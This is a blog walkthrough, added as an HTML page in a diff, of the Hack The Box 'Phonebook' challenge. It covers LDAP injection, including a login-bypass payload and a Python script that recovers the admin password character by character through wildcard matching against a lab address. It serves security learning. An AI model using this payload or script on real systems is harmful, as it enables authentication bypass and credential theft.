@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Phonebook HTB Walkthrough | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="HTB, Phonebook, LDAP, LDAP injection, authentication bypass, brute-force, Python, web hacking">
+<meta name="description" content="This post documents my process for solving the Phonebook box on Hack The Box. The box focuses on LDAP injection and brute-forcing credentials using knowledge of LDAP search/filter syntax.
+Solve
+I didn’t find any obvious attack vectors except for a DOM-based HTML injection. After checking a writeup, I learned the challenge was about LDAP injection—a topic I had little prior experience with.
+What is LDAP Injection?
+According to PayloadAllTheThings, LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping.">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2025-04-19-phonebook/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2025-04-19-phonebook/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2025-04-19-phonebook/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="Phonebook HTB Walkthrough">
+  <meta property="og:description" content="This post documents my process for solving the Phonebook box on Hack The Box. The box focuses on LDAP injection and brute-forcing credentials using knowledge of LDAP search/filter syntax.
+Solve I didn’t find any obvious attack vectors except for a DOM-based HTML injection. After checking a writeup, I learned the challenge was about LDAP injection—a topic I had little prior experience with.
+What is LDAP Injection? According to PayloadAllTheThings, LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-19T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-04-19T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Phonebook">
+    <meta property="article:tag" content="LDAP">
+    <meta property="article:tag" content="LDAP Injection">
+    <meta property="article:tag" content="Authentication Bypass">
+    <meta property="article:tag" content="Brute-Force">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Phonebook HTB Walkthrough">
+<meta name="twitter:description" content="This post documents my process for solving the Phonebook box on Hack The Box. The box focuses on LDAP injection and brute-forcing credentials using knowledge of LDAP search/filter syntax.
+Solve
+I didn’t find any obvious attack vectors except for a DOM-based HTML injection. After checking a writeup, I learned the challenge was about LDAP injection—a topic I had little prior experience with.
+What is LDAP Injection?
+According to PayloadAllTheThings, LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Phonebook HTB Walkthrough",
+      "item": "https://joonkim0625.github.io/posts/2025-04-19-phonebook/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Phonebook HTB Walkthrough",
+  "name": "Phonebook HTB Walkthrough",
+  "description": "This post documents my process for solving the Phonebook box on Hack The Box. The box focuses on LDAP injection and brute-forcing credentials using knowledge of LDAP search/filter syntax.\nSolve I didn’t find any obvious attack vectors except for a DOM-based HTML injection. After checking a writeup, I learned the challenge was about LDAP injection—a topic I had little prior experience with.\nWhat is LDAP Injection? According to PayloadAllTheThings, LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping.\n",
+  "keywords": [
+    "HTB", "Phonebook", "LDAP", "LDAP injection", "authentication bypass", "brute-force", "Python", "web hacking"
+  ],
+  "articleBody": "This post documents my process for solving the Phonebook box on Hack The Box. The box focuses on LDAP injection and brute-forcing credentials using knowledge of LDAP search/filter syntax.\nSolve I didn’t find any obvious attack vectors except for a DOM-based HTML injection. After checking a writeup, I learned the challenge was about LDAP injection—a topic I had little prior experience with.\nWhat is LDAP Injection? According to PayloadAllTheThings, LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping.\nHints On the page, there are several hints:\n“You can now login using the workstation username and password” Title: “Phonebook - Login” Potential username: “reese” These suggest the app uses LDAP for directory service.\nBypassing Login Trying tools like nikto or dirbuster didn’t help. Similar to SQLi testing, using ( or ) can sometimes break LDAP queries. Example payload:\nuser = Reese)(!(\u0026(1=0 pass = q)) This resulted in:\nquery = (\u0026(uid=admin)(!(\u0026(1=0)(userPassword=q)))) Using “Reese” (from the page) let me bypass authentication, but to fully exploit the system, more was needed.\nSearching via the app’s search bar, I found:\nEimile Pantlin\tepantlin1c@admin.ch\t690-650-9785 Trying “epantlin1c” with a similar payload worked too. Entering . in the search bar listed all possible users—likely because emails have dots.\nThe writeup referenced HackTricks LDAP Injection for more bypass tricks.\nBlind LDAP Injection (Brute-forcing Passwords) The main goal: discover the administrator (“Reese”) password with blind LDAP injection.\nManually, trying passwords for user “reese”:\n* → Success a* → Failure H* → Success This suggests the password starts with “H”. The wildcard * functions like a match-anything character. By iteratively adding characters (e.g., H*, Ha*, Hab*), you can brute-force the password one character at a time.\nBecause bypassing the login doesn’t get you far, the true challenge is scripting a blind brute-force for the admin password.\nExample Python Script Script based on the writeup’s logic:\nimport requests USERNAME = \"reese\" LOGIN_URL = \"http://83.136.255.192:56860/login\" CHARACTERS = \"qwertyuiopQWERTYUIOPasdfghjklASDFGHJKLzxcvbnmZXCVBNM_-[]{}1234567890\" def trylogin(user, pw): session = requests.Session() headers = { 'X-Forwarded-For': pw, 'Referer': LOGIN_URL } data = { \"username\": user, \"password\": pw } response = session.post(LOGIN_URL, headers=headers, data=data, allow_redirects=False) location = response.headers.get('location', '') return '/login' not in location def forceone(prefix): for x in CHARACTERS: test_pw = f\"{prefix}{x}*\" if trylogin(USERNAME, test_pw): return x return \"\" def forcer(): got = \"\" while True: next_char = forceone(got) if not next_char: print(\"No matching character found. Exiting.\") break got += next_char print(\"Discovered so far:\", got) if __name__ == \"__main__\": forcer() Lessons Learned LDAP injection is analogous to SQL injection but uses different operators, filters, and wildcards (*). Username enumeration and blind brute-force attacks can be surprisingly effective with LDAP. Scripting is essential for blind brute-force when each character must be discovered sequentially. Always check public writeups and references (like HackTricks) for injection tricks. Writeup based on my own exploitation process, with inspiration from CTF and security community references.\n",
+  "wordCount" : "480",
+  "inLanguage": "en",
+  "datePublished": "2025-04-19T00:00:00Z",
+  "dateModified": "2025-04-19T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2025-04-19-phonebook/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Phonebook HTB Walkthrough
+    </h1>
+    <div class="post-meta"><span title='2025-04-19 00:00:00 +0000 UTC'>April 19, 2025</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><p>This post documents my process for solving the <strong>Phonebook</strong> box on Hack The Box. The box focuses on LDAP injection and brute-forcing credentials using knowledge of LDAP search/filter syntax.</p>
+<h2 id="solve">Solve<a hidden class="anchor" aria-hidden="true" href="#solve">#</a></h2>
+<p>I didn’t find any obvious attack vectors except for a DOM-based HTML injection. After checking a writeup, I learned the challenge was about LDAP injection—a topic I had little prior experience with.</p>
+<h3 id="what-is-ldap-injection">What is LDAP Injection?<a hidden class="anchor" aria-hidden="true" href="#what-is-ldap-injection">#</a></h3>
+<p>According to PayloadAllTheThings, LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping.</p>
+<h2 id="hints">Hints<a hidden class="anchor" aria-hidden="true" href="#hints">#</a></h2>
+<p>On the page, there are several hints:</p>
+<ul>
+<li>&ldquo;You can now login using the workstation username and password&rdquo;</li>
+<li>Title: &ldquo;Phonebook - Login&rdquo;</li>
+<li>Potential username: &ldquo;reese&rdquo;</li>
+</ul>
+<p>These suggest the app uses LDAP for directory service.</p>
+<h2 id="bypassing-login">Bypassing Login<a hidden class="anchor" aria-hidden="true" href="#bypassing-login">#</a></h2>
+<p>Trying tools like <code>nikto</code> or <code>dirbuster</code> didn’t help. Similar to SQLi testing, using <code>(</code> or <code>)</code> can sometimes break LDAP queries. Example payload:</p>
+<pre tabindex="0"><code>user  = Reese)(!(&amp;(1=0
+pass  = q))
+</code></pre><p>This resulted in:</p>
+<pre tabindex="0"><code>query = (&amp;(uid=admin)(!(&amp;(1=0)(userPassword=q))))
+</code></pre><p>Using “Reese” (from the page) let me bypass authentication, but to fully exploit the system, more was needed.</p>
+<p>Searching via the app’s search bar, I found:</p>
+<pre tabindex="0"><code>Eimile Pantlin	epantlin1c@admin.ch	690-650-9785
+</code></pre><p>Trying “epantlin1c” with a similar payload worked too. Entering <code>.</code> in the search bar listed all possible users—likely because emails have dots.</p>
+<p>The writeup referenced <a href="https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html">HackTricks LDAP Injection</a> for more bypass tricks.</p>
+<h2 id="blind-ldap-injection-brute-forcing-passwords">Blind LDAP Injection (Brute-forcing Passwords)<a hidden class="anchor" aria-hidden="true" href="#blind-ldap-injection-brute-forcing-passwords">#</a></h2>
+<p>The main goal: discover the administrator (“Reese”) password with blind LDAP injection.</p>
+<p>Manually, trying passwords for user “reese”:</p>
+<ul>
+<li><code>*</code> → Success</li>
+<li><code>a*</code> → Failure</li>
+<li><code>H*</code> → Success</li>
+</ul>
+<p>This suggests the password starts with “H”. The wildcard <code>*</code> functions like a match-anything character. By iteratively adding characters (e.g., <code>H*</code>, <code>Ha*</code>, <code>Hab*</code>), you can brute-force the password one character at a time.</p>
+<p>Because bypassing the login doesn’t get you far, the <strong>true challenge is scripting a blind brute-force for the admin password</strong>.</p>
+<h2 id="example-python-script">Example Python Script<a hidden class="anchor" aria-hidden="true" href="#example-python-script">#</a></h2>
+<p>Script based on the writeup’s logic:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USERNAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;reese&#34;</span>
+</span></span><span style="display:flex;"><span>LOGIN_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://83.136.255.192:56860/login&#34;</span>
+</span></span><span style="display:flex;"><span>CHARACTERS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;qwertyuiopQWERTYUIOPasdfghjklASDFGHJKLzxcvbnmZXCVBNM_-[]</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">1234567890&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trylogin</span>(user, pw):
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: pw,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Referer&#39;</span>: LOGIN_URL
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;username&#34;</span>: user,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;password&#34;</span>: pw
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(LOGIN_URL, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    location <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;location&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;/login&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> location
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forceone</span>(prefix):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> CHARACTERS:
+</span></span><span style="display:flex;"><span>        test_pw <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">*&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> trylogin(USERNAME, test_pw):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> x
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forcer</span>():
+</span></span><span style="display:flex;"><span>    got <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        next_char <span style="color:#f92672">=</span> forceone(got)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> next_char:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;No matching character found. Exiting.&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        got <span style="color:#f92672">+=</span> next_char
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Discovered so far:&#34;</span>, got)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    forcer()
+</span></span></code></pre></div><h2 id="lessons-learned">Lessons Learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h2>
+<ul>
+<li>LDAP injection is analogous to SQL injection but uses different operators, filters, and wildcards (<code>*</code>).</li>
+<li>Username enumeration and blind brute-force attacks can be surprisingly effective with LDAP.</li>
+<li>Scripting is essential for blind brute-force when each character must be discovered sequentially.</li>
+<li>Always check public writeups and references (like <a href="https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html">HackTricks</a>) for injection tricks.</li>
+</ul>
+<hr>
+<p>Writeup based on my own exploitation process, with inspiration from CTF and security community references.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/phonebook/">Phonebook</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/ldap/">LDAP</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/ldap-injection/">LDAP Injection</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/authentication-bypass/">Authentication Bypass</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/brute-force/">Brute-Force</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/python/">Python</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/web-hacking/">Web Hacking</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
